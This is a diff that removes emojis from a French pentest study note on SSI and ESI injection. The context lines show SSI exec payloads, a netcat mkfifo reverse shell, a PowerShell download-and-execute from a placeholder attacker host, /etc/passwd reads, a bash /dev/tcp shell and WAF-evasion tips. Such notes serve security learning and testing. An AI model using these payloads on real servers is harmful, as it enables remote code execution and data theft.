@@ -12,7 +12,7 @@ statut: publie
 
 
 
-# 🧩 SSI Injection — Server Side Include
+# SSI Injection — Server Side Include
 
 > [!info] **En 1 phrase**
 > SSI = directives **évaluées côté serveur** dans les pages HTML → si une entrée utilisateur
@@ -22,7 +22,7 @@ statut: publie
 
 ---
 
-## 🎯 Concept
+## Concept
 
 ```mermaid
 flowchart LR
@@ -36,14 +36,14 @@ flowchart LR
     G --> I[Shell / reverse shell]
 ```
 
-> [!info] 💡 **Pourquoi ça marche**
+> [!info] **Pourquoi ça marche**
 > Les SSI sont des directives placées dans les pages HTML et **évaluées par le serveur**
 > au moment de servir la page. Si l'app concatène une entrée non filtrée dans une page
 > servie en `.shtml`, on peut sortir du contexte prévu et **injecter nos propres directives**.
 
 ---
 
-## 🧬 Rappel : le format SSI
+## Rappel : le format SSI
 
 > Les Server Side Includes (SSI) permettent de **générer du contenu dynamique** dans une page HTML
 > **sans CGI ni langage serveur** complet. Format général : `<!--#directive param="value" -->`
@@ -58,7 +58,7 @@ flowchart LR
 <!--#exec cmd="ls" -->                  <!-- exécuter une commande OS -->
 ```
 
-### 🎯 Quand ça s'applique
+### Quand ça s'applique
 
 | Critère | Détail |
 |---|---|
@@ -69,7 +69,7 @@ flowchart LR
 
 ---
 
-## 🔥 Payloads
+## Payloads
 
 ```html
 <!--#exec cmd="id" -->                          <!-- RCE : identité (Linux) -->
@@ -93,12 +93,12 @@ flowchart LR
 <!--#exec cmd="mkfifo /tmp/f;nc IP PORT 0</tmp/f|/bin/bash 1>/tmp/f;rm /tmp/f" -->
 ```
 
-> [!warning] ⚠️ Le pipe `|` et le `;` doivent passer tels quels dans la commande.
+> [!warning] Le pipe `|` et le `;` doivent passer tels quels dans la commande.
 > Si le WAF les bloque, encoder en `$IFS`, base64, ou passer par un script fichier.
 
 ---
 
-## 🚀 RCE
+## RCE
 
 ### Linux (Apache / mod_include)
 
@@ -116,7 +116,7 @@ flowchart LR
 <!--#exec cmd="powershell -nop -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/ps.ps1')" -->
 ```
 
-### 🎯 Injection dans un fichier déjà `.shtml` (second-order)
+### Injection dans un fichier déjà `.shtml` (second-order)
 
 > Si l'app écrit l'entrée utilisateur (commentaire, nom de fichier uploadé, champ de config)
 > **dans un fichier `.shtml`**, la directive est exécutée au **prochain chargement** de la page :
@@ -127,12 +127,12 @@ flowchart LR
 3. Payload "time-based"    →  <!--#exec cmd="sleep 10" -->  = confirmé si la page met 10 s à répondre
 ```
 
-> [!tip] 💡 C'est une **injection de type "stored/second-order"** : le payload n'a pas
+> [!tip] C'est une **injection de type "stored/second-order"** : le payload n'a pas
 > forcément d'effet immédiat, il s'active quand le fichier est servi.
 
 ---
 
-## 📂 Lecture de fichiers
+## Lecture de fichiers
 
 ```html
 <!--#include file="/etc/passwd" -->
@@ -155,7 +155,7 @@ flowchart LR
 
 ---
 
-## 🧰 Outils
+## Outils
 
 ```bash
 # SSTImap — détection SSI/SSTI automatique (basé sur tplmap)
@@ -168,7 +168,7 @@ python3 ./sstimap.py -i --legacy -A -m POST -l 5 -H 'Authorization: Basic bG9naW
 
 ---
 
-## 🌐 Edge Side Inclusion (ESI)
+## Edge Side Inclusion (ESI)
 
 > Variante moderne : les **caches HTTP** (surrogates) évaluent les tags ESI dans la réponse.
 > Un surrogate ne peut pas distinguer les tags **légitimes** de ceux **injectés** par l'attaquant.
@@ -202,9 +202,9 @@ Surrogate-Control: content="ESI/1.0"     # certains surrogates exigent ce header
 
 ---
 
-## 🕵️ Détection
+## Détection
 
-> [!tip] 💡 **Le test le plus simple :** injecter un `#echo` et observer le rendu.
+> [!tip] **Le test le plus simple :** injecter un `#echo` et observer le rendu.
 
 ```html
 <!--#echo var="DATE_LOCAL" -->
@@ -238,7 +238,7 @@ Surrogate-Control: content="ESI/1.0"     # certains surrogates exigent ce header
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Réponse | Détail |
 |---|---|
@@ -253,23 +253,23 @@ Surrogate-Control: content="ESI/1.0"     # certains surrogates exigent ce header
 
 ---
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
-> [!tip] 💡 **SSI = exécuté côté serveur**
+> [!tip] **SSI = exécuté côté serveur**
 > La directive est interprétée par le **serveur web** (pas par le navigateur, pas par PHP).
 > Un payload qui n'est pas dans un fichier `.shtml` (ou traité par un module SSI) restera du texte brut.
 
-> [!warning] ⚠️ **Pièges de l'extension**
+> [!warning] **Pièges de l'extension**
 > - Le fichier doit être servi avec une extension **`.shtml`** : renommer une page en `.shtml` peut suffire à déclencher l'interprétation.
 > - `<!--#include file="..." -->` = chemin **relatif au docroot** ; `virtual` = chemin d'URL.
 > - `#exec` peut être **désactivé** alors que `#include` et `#echo` restent actifs (config `IncludesNoExec`) → toujours tester les deux.
 > - Le serveur n'exécute pas les SSI dans les fichiers `.html` classiques par défaut.
 
-> [!tip] 💡 **Convertir un fichier normal en `.shtml`**
+> [!tip] **Convertir un fichier normal en `.shtml`**
 > `cp page.html page.shtml` (ou `mv`) puis re-servez la page : si l'app accepte d'écrire
 > dedans (upload, édition), c'est un vecteur **persistant** de RCE.
 
-> [!warning] ⚠️ **Pièges d'exploitation**
+> [!warning] **Pièges d'exploitation**
 > - Le résultat de `#exec` n'est pas toujours affiché (sortie serveur invisible) → préférer un **reverse shell** ou une écriture de fichier.
 > - `mkfifo ... nc ... | /bin/bash` nécessite `nc` sur la cible ; sinon `bash -i >& /dev/tcp/IP/PORT 0>&1`.
 > - WAF : `<!--#` est souvent filtré → tenter `<!-- #exec` (espace), encodage, ou découper le payload.
@@ -278,11 +278,11 @@ Surrogate-Control: content="ESI/1.0"     # certains surrogates exigent ce header
 
 ---
 
-## 🔗 Liens
+## Liens
 
-- [[LFI et RFI|📂 LFI / RFI]] — lecture de fichiers côté serveur
-- [[Injection de commandes|🐚 Injection de commandes]] — exécution de commandes OS
-- [[Upload de fichiers|📤 Upload]] — écrire un `.shtml` sur le serveur
-- → Note complète : [[03 - Exploitation Web|🌍 Exploitation Web]]
-- 📚 Source : [PayloadsAllTheThings — SSI](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Include%20Injection/README.md)
-- 📚 Références : [OWASP SSI Injection](https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection) · [HackTricks](https://book.hacktricks.xyz/pentesting-web/server-side-inclusion-edge-side-inclusion-injection) · [n00py — Exploiting SSI](https://www.n00py.io/2017/08/exploiting-server-side-include-injection/)
+- [[LFI et RFI| LFI / RFI]] — lecture de fichiers côté serveur
+- [[Injection de commandes| Injection de commandes]] — exécution de commandes OS
+- [[Upload de fichiers| Upload]] — écrire un `.shtml` sur le serveur
+- → Note complète : [[03 - Exploitation Web| Exploitation Web]]
+- Source : [PayloadsAllTheThings — SSI](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Include%20Injection/README.md)
+- Références : [OWASP SSI Injection](https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection) · [HackTricks](https://book.hacktricks.xyz/pentesting-web/server-side-inclusion-edge-side-inclusion-injection) · [n00py — Exploiting SSI](https://www.n00py.io/2017/08/exploiting-server-side-include-injection/)
